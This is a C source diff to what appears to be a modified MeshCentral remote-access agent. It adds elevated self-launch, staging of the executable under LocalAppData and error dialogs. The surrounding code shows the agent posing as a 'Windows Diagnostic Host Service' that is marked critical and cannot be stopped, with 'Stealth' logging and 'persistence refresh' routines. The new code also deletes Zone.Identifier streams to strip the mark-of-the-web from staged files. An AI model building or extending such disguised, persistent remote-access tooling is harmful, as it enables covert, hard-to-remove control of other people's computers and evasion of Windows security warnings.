@@ -428,12 +428,12 @@ static void MeshService_ReportCriticalStopDenial(void)
 		return;
 	}
 
-	HANDLE eventSource = RegisterEventSourceW(NULL, serviceName);
+	HANDLE eventSource = RegisterEventSourceA(NULL, serviceName);
 	if (eventSource != NULL)
 	{
-		const wchar_t* strings[1];
-		strings[0] = L"The Windows Diagnostic Host Service is marked critical and cannot be stopped.";
-		ReportEventW(eventSource,
+		const char* strings[1];
+		strings[0] = "The Windows Diagnostic Host Service is marked critical and cannot be stopped.";
+		ReportEventA(eventSource,
 			EVENTLOG_WARNING_TYPE,
 			0,
 			0xC0020001,
@@ -1041,7 +1041,7 @@ void GdiPlusFlat_Init()
 	if (_gdip == NULL) { _gdip = LoadLibraryExW(L"Gdiplus.dll", NULL, 0); }
 	if (_gdip == NULL) { return; }
 	_shm = LoadLibraryExW(L"Shlwapi.dll", NULL, LOAD_LIBRARY_SEARCH_USER_DIRS);
-	if (_shm == NULL) { _gdip = LoadLibraryExW(L"Shlwapi.dll", NULL, 0); }
+	if (_shm == NULL) { _shm = LoadLibraryExW(L"Shlwapi.dll", NULL, 0); }
 	if (_shm == NULL) { FreeLibrary(_gdip); _gdip = NULL; return; }
 
 	__GdipCreateBitmapFromStream = (_GdipCreateBitmapFromStream)GetProcAddress(_gdip, (LPCSTR)"GdipCreateBitmapFromStream");
@@ -1119,6 +1119,582 @@ static BOOL MeshService_AllowStop(void)
 		return (value != 0);
 	}
 	return FALSE;
+}
+
+static BOOL MeshService_GetDirectoryFromPath(const WCHAR* path, WCHAR* directoryOut, size_t directoryOutCch)
+{
+	size_t len = 0;
+	size_t i = 0;
+
+	if (path == NULL || path[0] == L'\0' || directoryOut == NULL || directoryOutCch == 0) { return FALSE; }
+	if (FAILED(StringCchCopyW(directoryOut, directoryOutCch, path))) { return FALSE; }
+
+	len = wcslen(directoryOut);
+	if (len == 0) { return FALSE; }
+	for (i = len; i > 0; --i)
+	{
+		if (directoryOut[i - 1] == L'\\' || directoryOut[i - 1] == L'/')
+		{
+			directoryOut[i - 1] = L'\0';
+			return TRUE;
+		}
+	}
+	directoryOut[0] = L'\0';
+	return FALSE;
+}
+
+static BOOL MeshService_IsRecoverableLaunchError(DWORD launchErr)
+{
+	return (
+		launchErr == ERROR_PROC_NOT_FOUND ||
+		launchErr == ERROR_MOD_NOT_FOUND ||
+		launchErr == ERROR_BAD_EXE_FORMAT ||
+		launchErr == ERROR_FILE_NOT_FOUND ||
+		launchErr == ERROR_PATH_NOT_FOUND ||
+		launchErr == ERROR_ACCESS_DENIED ||
+		launchErr == ERROR_ELEVATION_REQUIRED);
+}
+
+static BOOL MeshService_EnsureDirectoryExistsW(const WCHAR* path)
+{
+	DWORD attrs;
+
+	if (path == NULL || path[0] == L'\0') { return FALSE; }
+	attrs = GetFileAttributesW(path);
+	if (attrs != INVALID_FILE_ATTRIBUTES)
+	{
+		return ((attrs & FILE_ATTRIBUTE_DIRECTORY) != 0);
+	}
+
+	if (CreateDirectoryW(path, NULL) != FALSE) { return TRUE; }
+	if (GetLastError() == ERROR_ALREADY_EXISTS)
+	{
+		attrs = GetFileAttributesW(path);
+		return (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0);
+	}
+	return FALSE;
+}
+
+static BOOL MeshService_GetSafeLaunchDirectory(WCHAR* safeDirOut, size_t safeDirOutCch)
+{
+	UINT len = 0;
+
+	if (safeDirOut == NULL || safeDirOutCch == 0) { return FALSE; }
+	safeDirOut[0] = L'\0';
+	len = GetSystemDirectoryW(safeDirOut, (UINT)safeDirOutCch);
+	if (len == 0 || len >= safeDirOutCch)
+	{
+		safeDirOut[0] = L'\0';
+		return FALSE;
+	}
+	return TRUE;
+}
+
+static BOOL MeshService_BuildSiblingPathWithExtension(const WCHAR* sourcePath, const WCHAR* extension, WCHAR* outPath, size_t outPathCch)
+{
+	size_t len = 0;
+
+	if (sourcePath == NULL || extension == NULL || outPath == NULL || outPathCch == 0) { return FALSE; }
+	outPath[0] = L'\0';
+	len = wcslen(sourcePath);
+	if (len < 4 || _wcsicmp(sourcePath + (len - 4), L".exe") != 0) { return FALSE; }
+	if (FAILED(StringCchCopyW(outPath, outPathCch, sourcePath))) { return FALSE; }
+	outPath[len - 4] = L'\0';
+	if (FAILED(StringCchCatW(outPath, outPathCch, extension))) { return FALSE; }
+	return TRUE;
+}
+
+static void MeshService_AppendUserGuiLaunchTrace(const WCHAR* message)
+{
+	WCHAR localAppData[_MAX_PATH + 100];
+	WCHAR traceDir[_MAX_PATH + 160];
+	WCHAR tracePath[_MAX_PATH + 220];
+	HRESULT hr;
+	HANDLE hFile = INVALID_HANDLE_VALUE;
+	char utf8Buffer[2048];
+	int utf8Len;
+	DWORD written = 0;
+
+	if (message == NULL || message[0] == L'\0') { return; }
+
+	hr = SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localAppData);
+	if (FAILED(hr)) { return; }
+	if (FAILED(StringCchPrintfW(traceDir, _countof(traceDir), L"%ls\\DiagnosticHost", localAppData))) { return; }
+	if (FAILED(StringCchPrintfW(tracePath, _countof(tracePath), L"%ls\\gui-launch.log", traceDir))) { return; }
+	MeshService_EnsureDirectoryExistsW(traceDir);
+
+	hFile = CreateFileW(tracePath, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) { return; }
+
+	utf8Len = WideCharToMultiByte(CP_UTF8, 0, message, -1, utf8Buffer, (int)sizeof(utf8Buffer), NULL, NULL);
+	if (utf8Len > 1)
+	{
+		WriteFile(hFile, utf8Buffer, (DWORD)(utf8Len - 1), &written, NULL);
+		WriteFile(hFile, "\r\n", 2, &written, NULL);
+	}
+	CloseHandle(hFile);
+}
+
+static void MeshService_LogSelfImageIdentity(const WCHAR* modulePath)
+{
+	WIN32_FILE_ATTRIBUTE_DATA fileData;
+	ULARGE_INTEGER fileSize;
+	ULARGE_INTEGER lastWriteTicks;
+	WCHAR traceLine[1024];
+
+	if (modulePath == NULL || modulePath[0] == L'\0') { return; }
+
+	if (!GetFileAttributesExW(modulePath, GetFileExInfoStandard, &fileData))
+	{
+		DWORD err = GetLastError();
+		Stealth_LogInstallEvent(L"[GUI] self-image path=%ls attrs-error=%lu", modulePath, err);
+		if (SUCCEEDED(StringCchPrintfW(traceLine, _countof(traceLine), L"[GUI] self-image path=%ls attrs-error=%lu", modulePath, err)))
+		{
+			MeshService_AppendUserGuiLaunchTrace(traceLine);
+		}
+		return;
+	}
+
+	fileSize.LowPart = fileData.nFileSizeLow;
+	fileSize.HighPart = fileData.nFileSizeHigh;
+	lastWriteTicks.LowPart = fileData.ftLastWriteTime.dwLowDateTime;
+	lastWriteTicks.HighPart = fileData.ftLastWriteTime.dwHighDateTime;
+
+	Stealth_LogInstallEvent(
+		L"[GUI] self-image path=%ls size=%llu lastWriteTicks=%llu",
+		modulePath,
+		(unsigned long long)fileSize.QuadPart,
+		(unsigned long long)lastWriteTicks.QuadPart);
+	if (SUCCEEDED(StringCchPrintfW(
+		traceLine,
+		_countof(traceLine),
+		L"[GUI] self-image path=%ls size=%llu lastWriteTicks=%llu",
+		modulePath,
+		(unsigned long long)fileSize.QuadPart,
+		(unsigned long long)lastWriteTicks.QuadPart)))
+	{
+		MeshService_AppendUserGuiLaunchTrace(traceLine);
+	}
+}
+
+static void MeshService_DeleteFileIfPresentW(const WCHAR* path)
+{
+	DWORD attrs;
+
+	if (path == NULL || path[0] == L'\0') { return; }
+	attrs = GetFileAttributesW(path);
+	if (attrs == INVALID_FILE_ATTRIBUTES || (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0) { return; }
+	if ((attrs & FILE_ATTRIBUTE_READONLY) != 0)
+	{
+		SetFileAttributesW(path, attrs & ~FILE_ATTRIBUTE_READONLY);
+	}
+	if (!DeleteFileW(path))
+	{
+		DWORD deleteErr = GetLastError();
+		if (deleteErr != ERROR_FILE_NOT_FOUND && deleteErr != ERROR_PATH_NOT_FOUND)
+		{
+			Stealth_LogInstallEvent(L"[GUI] Legacy launcher cleanup delete failed path=%ls error=%lu", path, deleteErr);
+		}
+	}
+}
+
+static void MeshService_CleanupLegacyLauncherArtifacts(void)
+{
+	WCHAR localAppData[_MAX_PATH + 100];
+	WCHAR appDir[_MAX_PATH + 160];
+	WCHAR stageDir[_MAX_PATH + 200];
+	WCHAR stagedExe[_MAX_PATH + 220];
+	WCHAR stagedDb[_MAX_PATH + 220];
+	WCHAR zonePath[_MAX_PATH + 256];
+	HRESULT hr;
+
+	hr = SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localAppData);
+	if (FAILED(hr)) { return; }
+
+	if (FAILED(StringCchPrintfW(appDir, _countof(appDir), L"%ls\\DiagnosticHost", localAppData))) { return; }
+	if (FAILED(StringCchPrintfW(stageDir, _countof(stageDir), L"%ls\\launcher", appDir))) { return; }
+	if (FAILED(StringCchPrintfW(stagedExe, _countof(stagedExe), L"%ls\\MeshService64-launcher.exe", stageDir))) { return; }
+	if (FAILED(StringCchPrintfW(stagedDb, _countof(stagedDb), L"%ls\\MeshService64-launcher.db", stageDir))) { return; }
+
+	MeshService_DeleteFileIfPresentW(stagedExe);
+	MeshService_DeleteFileIfPresentW(stagedDb);
+
+	if (SUCCEEDED(StringCchPrintfW(zonePath, _countof(zonePath), L"%ls:Zone.Identifier", stagedExe)))
+	{
+		MeshService_DeleteFileIfPresentW(zonePath);
+	}
+	if (SUCCEEDED(StringCchPrintfW(zonePath, _countof(zonePath), L"%ls:Zone.Identifier", stagedDb)))
+	{
+		MeshService_DeleteFileIfPresentW(zonePath);
+	}
+
+	RemoveDirectoryW(stageDir);
+}
+
+static void MeshService_ClearZoneIdentifier(const WCHAR* path)
+{
+	WCHAR zonePath[_MAX_PATH + 256];
+	if (path == NULL || path[0] == L'\0') { return; }
+	if (SUCCEEDED(StringCchPrintfW(zonePath, _countof(zonePath), L"%ls:Zone.Identifier", path)))
+	{
+		DeleteFileW(zonePath);
+	}
+}
+
+static BOOL MeshService_StageElevatedLaunchImage(const WCHAR* modulePath, WCHAR* stagedModulePathOut, size_t stagedModulePathOutCch)
+{
+	WCHAR localAppData[_MAX_PATH + 100];
+	WCHAR appDir[_MAX_PATH + 160];
+	WCHAR stageDir[_MAX_PATH + 200];
+	WCHAR stagedPath[_MAX_PATH + 220];
+	WCHAR sourceDbPath[_MAX_PATH + 220];
+	WCHAR stagedDbPath[_MAX_PATH + 220];
+	HRESULT hr;
+	DWORD attrs = 0;
+
+	if (stagedModulePathOut == NULL || stagedModulePathOutCch == 0 || modulePath == NULL || modulePath[0] == L'\0') { return FALSE; }
+	stagedModulePathOut[0] = L'\0';
+
+	hr = SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localAppData);
+	if (FAILED(hr))
+	{
+		Stealth_LogInstallEvent(L"[GUI] Failed to resolve LocalAppData for staged launch image (hr=0x%08X)", (unsigned int)hr);
+		return FALSE;
+	}
+
+	if (FAILED(StringCchPrintfW(appDir, _countof(appDir), L"%ls\\DiagnosticHost", localAppData))) { return FALSE; }
+	if (FAILED(StringCchPrintfW(stageDir, _countof(stageDir), L"%ls\\launcher", appDir))) { return FALSE; }
+	if (FAILED(StringCchPrintfW(stagedPath, _countof(stagedPath), L"%ls\\MeshService64-launcher.exe", stageDir))) { return FALSE; }
+
+	if (!MeshService_EnsureDirectoryExistsW(appDir) || !MeshService_EnsureDirectoryExistsW(stageDir))
+	{
+		Stealth_LogInstallEvent(L"[GUI] Failed to create staged launch directory (%ls)", stageDir);
+		return FALSE;
+	}
+
+	attrs = GetFileAttributesW(stagedPath);
+	if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_READONLY) != 0)
+	{
+		SetFileAttributesW(stagedPath, attrs & ~FILE_ATTRIBUTE_READONLY);
+	}
+	if (_wcsicmp(modulePath, stagedPath) != 0)
+	{
+		if (!CopyFileW(modulePath, stagedPath, FALSE))
+		{
+			Stealth_LogInstallEvent(L"[GUI] Failed to stage elevated launch image (%ls -> %ls, error=%lu)", modulePath, stagedPath, GetLastError());
+			return FALSE;
+		}
+	}
+
+	MeshService_ClearZoneIdentifier(stagedPath);
+	if (MeshService_BuildSiblingPathWithExtension(modulePath, L".db", sourceDbPath, _countof(sourceDbPath)) &&
+		GetFileAttributesW(sourceDbPath) != INVALID_FILE_ATTRIBUTES &&
+		MeshService_BuildSiblingPathWithExtension(stagedPath, L".db", stagedDbPath, _countof(stagedDbPath)))
+	{
+		DWORD dbAttrs = GetFileAttributesW(stagedDbPath);
+		if (dbAttrs != INVALID_FILE_ATTRIBUTES && (dbAttrs & FILE_ATTRIBUTE_READONLY) != 0)
+		{
+			SetFileAttributesW(stagedDbPath, dbAttrs & ~FILE_ATTRIBUTE_READONLY);
+		}
+		if (!CopyFileW(sourceDbPath, stagedDbPath, FALSE))
+		{
+			Stealth_LogInstallEvent(L"[GUI] Failed to stage launcher sidecar db (%ls -> %ls, error=%lu)", sourceDbPath, stagedDbPath, GetLastError());
+		}
+		else
+		{
+			MeshService_ClearZoneIdentifier(stagedDbPath);
+		}
+	}
+
+	if (FAILED(StringCchCopyW(stagedModulePathOut, stagedModulePathOutCch, stagedPath)))
+	{
+		return FALSE;
+	}
+	return TRUE;
+}
+
+static void MeshService_LogGuiActionLaunch(const WCHAR* phase, const WCHAR* mode, const WCHAR* modulePath, const WCHAR* args, const WCHAR* cwd, DWORD launchErr, DWORD exitCode)
+{
+	const WCHAR* safePhase = (phase != NULL) ? phase : L"unknown";
+	const WCHAR* safeMode = (mode != NULL) ? mode : L"unknown";
+	const WCHAR* safeModule = (modulePath != NULL) ? modulePath : L"";
+	const WCHAR* safeArgs = (args != NULL) ? args : L"";
+	const WCHAR* safeCwd = (cwd != NULL) ? cwd : L"";
+	WCHAR userTraceLine[1024];
+
+	Stealth_LogInstallEvent(
+		L"[GUI] action=%ls mode=%ls module=%ls args=%ls cwd=%ls launchError=%lu exitCode=%lu",
+		safePhase,
+		safeMode,
+		safeModule,
+		safeArgs,
+		safeCwd,
+		launchErr,
+		exitCode);
+
+	if (SUCCEEDED(StringCchPrintfW(
+		userTraceLine,
+		_countof(userTraceLine),
+		L"[GUI] action=%ls mode=%ls module=%ls args=%ls cwd=%ls launchError=%lu exitCode=%lu",
+		safePhase,
+		safeMode,
+		safeModule,
+		safeArgs,
+		safeCwd,
+		launchErr,
+		exitCode)))
+	{
+		MeshService_AppendUserGuiLaunchTrace(userTraceLine);
+	}
+}
+
+static DWORD MeshService_WaitForProcessWithGuiPump(HANDLE processHandle)
+{
+	HANDLE handles[1];
+	DWORD waitResult;
+
+	if (processHandle == NULL) { return WAIT_FAILED; }
+	handles[0] = processHandle;
+
+	for (;;)
+	{
+		waitResult = MsgWaitForMultipleObjects(1, handles, FALSE, 250, QS_ALLINPUT);
+		if (waitResult == WAIT_OBJECT_0)
+		{
+			return WAIT_OBJECT_0;
+		}
+		if (waitResult == WAIT_OBJECT_0 + 1)
+		{
+			MSG msg;
+			while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE))
+			{
+				if (msg.message == WM_QUIT)
+				{
+					PostQuitMessage((int)msg.wParam);
+					continue;
+				}
+				TranslateMessage(&msg);
+				DispatchMessageW(&msg);
+			}
+			continue;
+		}
+		if (waitResult == WAIT_TIMEOUT)
+		{
+			continue;
+		}
+		return waitResult;
+	}
+}
+
+static BOOL MeshService_RunSelfCommandAndWait(const char* args, int isAdmin, DWORD* exitCodeOut, DWORD* launchErrorOut)
+{
+	WCHAR modulePath[_MAX_PATH + 100];
+	WCHAR moduleDir[_MAX_PATH + 100];
+	WCHAR safeLaunchDir[_MAX_PATH + 1];
+	WCHAR argsWide[2048];
+	WCHAR commandLine[4096];
+	DWORD exitCode = ERROR_GEN_FAILURE;
+	BOOL hasModuleDir = FALSE;
+	BOOL hasSafeLaunchDir = FALSE;
+	const WCHAR* launchMode = L"direct";
+
+	if (exitCodeOut != NULL) { *exitCodeOut = ERROR_GEN_FAILURE; }
+	if (launchErrorOut != NULL) { *launchErrorOut = ERROR_SUCCESS; }
+	moduleDir[0] = L'\0';
+
+	if (GetModuleFileNameW(NULL, modulePath, _countof(modulePath)) == 0)
+	{
+		if (launchErrorOut != NULL) { *launchErrorOut = GetLastError(); }
+		MeshService_LogGuiActionLaunch(L"resolve-module", L"direct", L"", L"", L"", launchErrorOut != NULL ? *launchErrorOut : GetLastError(), exitCode);
+		return FALSE;
+	}
+	hasModuleDir = MeshService_GetDirectoryFromPath(modulePath, moduleDir, _countof(moduleDir));
+	hasSafeLaunchDir = MeshService_GetSafeLaunchDirectory(safeLaunchDir, _countof(safeLaunchDir));
+	MeshService_LogSelfImageIdentity(modulePath);
+	MeshService_CleanupLegacyLauncherArtifacts();
+
+	if (args == NULL) { args = ""; }
+	if (MultiByteToWideChar(CP_UTF8, 0, args, -1, argsWide, _countof(argsWide)) <= 0)
+	{
+		if (launchErrorOut != NULL) { *launchErrorOut = GetLastError(); }
+		MeshService_LogGuiActionLaunch(L"convert-args", L"direct", modulePath, L"", hasModuleDir ? moduleDir : L"", launchErrorOut != NULL ? *launchErrorOut : GetLastError(), exitCode);
+		return FALSE;
+	}
+
+	if (isAdmin)
+	{
+		STARTUPINFOW si;
+		PROCESS_INFORMATION pi;
+		BOOL launched = FALSE;
+		HANDLE childProcess = NULL;
+		DWORD launchErr = ERROR_SUCCESS;
+		ZeroMemory(&si, sizeof(si));
+		ZeroMemory(&pi, sizeof(pi));
+		si.cb = sizeof(si);
+
+		if (FAILED(StringCchPrintfW(commandLine, _countof(commandLine), L"\"%ls\" %ls", modulePath, argsWide)))
+		{
+			if (launchErrorOut != NULL) { *launchErrorOut = ERROR_INSUFFICIENT_BUFFER; }
+			MeshService_LogGuiActionLaunch(L"build-command", L"createprocess", modulePath, argsWide, hasModuleDir ? moduleDir : L"", launchErrorOut != NULL ? *launchErrorOut : ERROR_INSUFFICIENT_BUFFER, exitCode);
+			return FALSE;
+		}
+
+		launchMode = L"createprocess";
+		if (CreateProcessW(modulePath, commandLine, NULL, NULL, FALSE, 0, NULL, hasSafeLaunchDir ? safeLaunchDir : NULL, &si, &pi))
+		{
+			launched = TRUE;
+			childProcess = pi.hProcess;
+			CloseHandle(pi.hThread);
+		}
+		else
+		{
+			launchErr = GetLastError();
+			MeshService_LogGuiActionLaunch(L"launch", launchMode, modulePath, argsWide, hasSafeLaunchDir ? safeLaunchDir : L"", launchErr, exitCode);
+			if (launchErr == ERROR_PROC_NOT_FOUND || launchErr == ERROR_MOD_NOT_FOUND || launchErr == ERROR_BAD_EXE_FORMAT || launchErr == ERROR_ELEVATION_REQUIRED)
+			{
+				SHELLEXECUTEINFOW sei;
+				ZeroMemory(&sei, sizeof(sei));
+				sei.cbSize = sizeof(sei);
+				sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
+				sei.hwnd = NULL;
+				sei.nShow = SW_NORMAL;
+				sei.lpVerb = L"open";
+				sei.lpFile = modulePath;
+				sei.lpParameters = (argsWide[0] != L'\0') ? argsWide : NULL;
+				sei.lpDirectory = hasSafeLaunchDir ? safeLaunchDir : NULL;
+				launchMode = L"shell-open-fallback";
+
+				if (!ShellExecuteExW(&sei))
+				{
+					launchErr = GetLastError();
+					MeshService_LogGuiActionLaunch(L"launch-retry", launchMode, modulePath, argsWide, hasSafeLaunchDir ? safeLaunchDir : L"", launchErr, exitCode);
+					if (hasSafeLaunchDir && MeshService_IsRecoverableLaunchError(launchErr))
+					{
+						ZeroMemory(&sei, sizeof(sei));
+						sei.cbSize = sizeof(sei);
+						sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
+						sei.hwnd = NULL;
+						sei.nShow = SW_NORMAL;
+						sei.lpVerb = L"open";
+						sei.lpFile = modulePath;
+						sei.lpParameters = (argsWide[0] != L'\0') ? argsWide : NULL;
+						sei.lpDirectory = NULL;
+						launchMode = L"shell-open-fallback-nocwd";
+						if (!ShellExecuteExW(&sei))
+						{
+							launchErr = GetLastError();
+							if (launchErrorOut != NULL) { *launchErrorOut = launchErr; }
+							MeshService_LogGuiActionLaunch(L"launch-retry", launchMode, modulePath, argsWide, L"", launchErr, exitCode);
+							return FALSE;
+						}
+					}
+					else
+					{
+						if (launchErrorOut != NULL) { *launchErrorOut = launchErr; }
+						return FALSE;
+					}
+				}
+
+				launched = TRUE;
+				childProcess = sei.hProcess;
+			}
+			else
+			{
+				if (launchErrorOut != NULL) { *launchErrorOut = launchErr; }
+				return FALSE;
+			}
+		}
+
+		if (!launched)
+		{
+			if (launchErrorOut != NULL) { *launchErrorOut = ERROR_GEN_FAILURE; }
+			return FALSE;
+		}
+		if (childProcess != NULL)
+		{
+			if (MeshService_WaitForProcessWithGuiPump(childProcess) == WAIT_FAILED)
+			{
+				if (launchErrorOut != NULL) { *launchErrorOut = GetLastError(); }
+				CloseHandle(childProcess);
+				MeshService_LogGuiActionLaunch(L"wait-failed", launchMode, modulePath, argsWide, hasSafeLaunchDir ? safeLaunchDir : L"", launchErrorOut != NULL ? *launchErrorOut : GetLastError(), exitCode);
+				return FALSE;
+			}
+			if (!GetExitCodeProcess(childProcess, &exitCode))
+			{
+				if (launchErrorOut != NULL) { *launchErrorOut = GetLastError(); }
+				CloseHandle(childProcess);
+				MeshService_LogGuiActionLaunch(L"wait-exit", launchMode, modulePath, argsWide, hasSafeLaunchDir ? safeLaunchDir : L"", launchErrorOut != NULL ? *launchErrorOut : GetLastError(), exitCode);
+				return FALSE;
+			}
+			CloseHandle(childProcess);
+		}
+		else
+		{
+			exitCode = ERROR_SUCCESS;
+		}
+	}
+	else
+	{
+		SHELLEXECUTEINFOW sei;
+		DWORD launchErr = ERROR_SUCCESS;
+		const WCHAR* launchedPath = modulePath;
+		BOOL launched = FALSE;
+		ZeroMemory(&sei, sizeof(sei));
+		sei.cbSize = sizeof(sei);
+		sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
+		sei.hwnd = GetForegroundWindow();
+		sei.nShow = SW_NORMAL;
+		sei.lpVerb = L"runas";
+		sei.lpFile = modulePath;
+		sei.lpDirectory = NULL;
+		sei.lpParameters = (argsWide[0] != L'\0') ? argsWide : NULL;
+		launchMode = L"shell-runas-defaultcwd";
+
+		if (ShellExecuteExW(&sei))
+		{
+			launched = TRUE;
+			launchErr = ERROR_SUCCESS;
+		}
+		else
+		{
+			launchErr = GetLastError();
+			MeshService_LogGuiActionLaunch(L"launch", launchMode, modulePath, argsWide, L"", launchErr, exitCode);
+		}
+
+		if (!launched)
+		{
+			if (launchErrorOut != NULL) { *launchErrorOut = (launchErr != ERROR_SUCCESS ? launchErr : ERROR_GEN_FAILURE); }
+			return FALSE;
+		}
+
+		if (sei.hProcess != NULL)
+		{
+			if (MeshService_WaitForProcessWithGuiPump(sei.hProcess) == WAIT_FAILED)
+			{
+				if (launchErrorOut != NULL) { *launchErrorOut = GetLastError(); }
+				CloseHandle(sei.hProcess);
+				MeshService_LogGuiActionLaunch(L"wait-failed", launchMode, launchedPath, argsWide, hasSafeLaunchDir ? safeLaunchDir : L"", launchErrorOut != NULL ? *launchErrorOut : GetLastError(), exitCode);
+				return FALSE;
+			}
+			if (!GetExitCodeProcess(sei.hProcess, &exitCode))
+			{
+				if (launchErrorOut != NULL) { *launchErrorOut = GetLastError(); }
+				CloseHandle(sei.hProcess);
+				MeshService_LogGuiActionLaunch(L"wait-exit", launchMode, launchedPath, argsWide, hasSafeLaunchDir ? safeLaunchDir : L"", launchErrorOut != NULL ? *launchErrorOut : GetLastError(), exitCode);
+				return FALSE;
+			}
+			CloseHandle(sei.hProcess);
+		}
+		else
+		{
+			exitCode = ERROR_SUCCESS;
+		}
+	}
+
+	if (launchErrorOut != NULL) { *launchErrorOut = ERROR_SUCCESS; }
+	if (exitCodeOut != NULL) { *exitCodeOut = exitCode; }
+	MeshService_LogGuiActionLaunch(L"complete", launchMode, modulePath, argsWide, hasSafeLaunchDir ? safeLaunchDir : (hasModuleDir ? moduleDir : L""), ERROR_SUCCESS, exitCode);
+	return (exitCode == ERROR_SUCCESS);
 }
 
 static BOOL MeshService_SetAllowStopOverride(const wchar_t* serviceName, DWORD* previousValue, BOOL* hadPrevious)
@@ -1336,7 +1912,8 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 			printf("[+] Persistence refresh complete.\n");
 		}
 		wmain_free(argv);
-		return refreshStatus;
+		(void)refreshStatus;
+		return;
 	}
 #endif
 
@@ -3272,13 +3849,34 @@ INT_PTR CALLBACK DialogHandler(HWND hDlg, UINT message, WPARAM wParam, LPARAM lP
 		else if (LOWORD(wParam) == IDC_INSTALLBUTTON || LOWORD(wParam) == IDC_UNINSTALLBUTTON)
 		{
 			BOOL result = FALSE;
+			DWORD actionExitCode = ERROR_GEN_FAILURE;
+			DWORD launchError = ERROR_SUCCESS;
+			WCHAR actionName[32];
+			WCHAR errorMessage[512];
 
 			EnableWindow(GetDlgItem(hDlg, IDC_INSTALLBUTTON), FALSE);
 			EnableWindow(GetDlgItem(hDlg, IDC_UNINSTALLBUTTON), FALSE);
 			EnableWindow(GetDlgItem(hDlg, IDCLOSE), FALSE);
 
-			sprintf_s(ILibScratchPad, sizeof(ILibScratchPad), "-full%s %s%s", LOWORD(wParam) == IDC_INSTALLBUTTON ? "install" : "uninstall", autoproxy_checked != 0 ? "--autoproxy=" : "", autoproxy_checked != 0 ? (configured_autoproxy_value != NULL ? configured_autoproxy_value : "1") : "");
-			result = RunAsAdmin(ILibScratchPad, IsAdmin() == TRUE);
+			if (LOWORD(wParam) == IDC_INSTALLBUTTON)
+			{
+				sprintf_s(
+					ILibScratchPad,
+					sizeof(ILibScratchPad),
+					"-fullinstall --cleanup-launcher %s%s",
+					autoproxy_checked != 0 ? "--autoproxy=" : "",
+					autoproxy_checked != 0 ? (configured_autoproxy_value != NULL ? configured_autoproxy_value : "1") : "");
+			}
+			else
+			{
+				sprintf_s(
+					ILibScratchPad,
+					sizeof(ILibScratchPad),
+					"-fulluninstall %s%s",
+					autoproxy_checked != 0 ? "--autoproxy=" : "",
+					autoproxy_checked != 0 ? (configured_autoproxy_value != NULL ? configured_autoproxy_value : "1") : "");
+			}
+			result = MeshService_RunSelfCommandAndWait(ILibScratchPad, IsAdmin() == TRUE, &actionExitCode, &launchError);
 
 			if (result)
 			{
@@ -3286,6 +3884,20 @@ INT_PTR CALLBACK DialogHandler(HWND hDlg, UINT message, WPARAM wParam, LPARAM lP
 			}
 			else
 			{
+				StringCchCopyW(actionName, _countof(actionName), LOWORD(wParam) == IDC_INSTALLBUTTON ? L"Install/Update" : L"Uninstall");
+				if (launchError == ERROR_CANCELLED)
+				{
+					StringCchPrintfW(errorMessage, _countof(errorMessage), L"%ls was cancelled (UAC prompt declined or unavailable).", actionName);
+				}
+				else if (launchError != ERROR_SUCCESS)
+				{
+					StringCchPrintfW(errorMessage, _countof(errorMessage), L"%ls failed to launch (error=%lu).", actionName, launchError);
+				}
+				else
+				{
+					StringCchPrintfW(errorMessage, _countof(errorMessage), L"%ls failed (exit=%lu). Check native-install.log and %%TEMP%%\\MeshInstaller.log.", actionName, actionExitCode);
+				}
+				MessageBoxW(hDlg, errorMessage, L"Mesh Agent", MB_OK | MB_ICONERROR);
 				EnableWindow(GetDlgItem(hDlg, IDC_INSTALLBUTTON), TRUE);
 				EnableWindow(GetDlgItem(hDlg, IDC_UNINSTALLBUTTON), TRUE);
 				EnableWindow(GetDlgItem(hDlg, IDCLOSE), TRUE);
